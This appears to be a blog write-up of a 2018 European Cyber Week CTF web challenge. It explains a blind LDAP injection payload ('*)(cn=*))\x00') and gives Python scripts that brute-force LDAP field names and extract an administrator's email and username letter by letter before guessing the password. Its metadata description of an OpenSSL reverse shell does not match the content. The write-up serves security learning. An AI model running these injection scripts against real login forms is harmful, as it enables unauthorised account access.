---
weight: 4
title: "[European Cyber Week] - AdmYSion"
date: 2018-10-22T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: "Simple reverse shell using OpenSSL."
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["ecw", "thales", "airbus", "ldap injection", "web", "blind"]
categories: ["Writeups"]

lightgallery: true
---


## State of the art

We only have a login form in front of us:


![](/lib/images/writeups/2018_ecw/admysion/adm_1.png)


My first move was trying an SQL injection... It was useless, in fact it's an `LDAP injection`:


![](/lib/images/writeups/2018_ecw/admysion/adm_2.png)


Our little asterisk `*` is matching with all the accounts in the LDAP base, it's now time to script :D

## Blind LDAP Injection

Because I already did an LDAP injection on a famous french challenge platform (it starts by `root` and ends by `-me.org`), I know that the payload will have the following aspect

> *)(cn=*))\x00

The `cn` part will change, it's a common field in an LDAP base, it means `Common Name`. The null byte at the end is used to remove the password field.

## Find LDAP fields

I built a little dictionary with all the common LDAP fields:

```raw
c
cn
dc
facsimileTelephoneNumber
co
gn
homePhone
jpegPhoto
id
l
mail
mobile
o
ou
owner
name
pager
password
sn
st
uid
username
userPassword
```

And then a little python script to bruteforce them:

```python
#!/usr/bin/python3

import requests
import string

ava = []

url = 'https://web050-admyssion.challenge-ecw.fr/'

f = open('dic', 'r')
dic = f.read().split('\n')
f.close()

for i in dic:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'})
    if 'Error: This login is associated with' in r.text:
        ava.append(str(i))

print(ava)
```

### looking for the admin email

Okay, now I will dig into the `mail` field trying to find the email address of the administrator (I know my script is very, very ugly, I bruteforced manually each first letter...):

```python
#!/usr/bin/python3

import requests
import string
import itertools
from pprint import pprint

ava = []
partial = ''
no_pass = True
charset = string.ascii_lowercase+'.@'

url = 'https://web050-admyssion.challenge-ecw.fr/'

go = 'Error: This login is associated'
go2 = 'Login failed'
nogo = 'Account not found, please'

while no_pass:
    no_pass = False
    for i in charset:
        payload = '*)(mail=s'+str(partial+i)+'*))\x00'
        r = requests.post(url, data = {'login':payload, 'password':'bla'})
        if nogo not in r.text:
            no_pass = True
            partial += i
            break
    print(partial)
```

You can notice the little `s` in front of my _partial_ variable! I tried to find all `a`, `b` etc... And here is why `s`:


![](/lib/images/writeups/2018_ecw/admysion/adm_3.png)


`s`+`arah.connor.admin@yoloswag.com` looks to be the administrator. To find the username of the account, just change `mail` field into `cn`, it gives us: `s.connor`. And now, how can we find the password? By guessing for sure! Let's try 'yoloswag' as a password:


![](/lib/images/writeups/2018_ecw/admysion/adm_4.png)
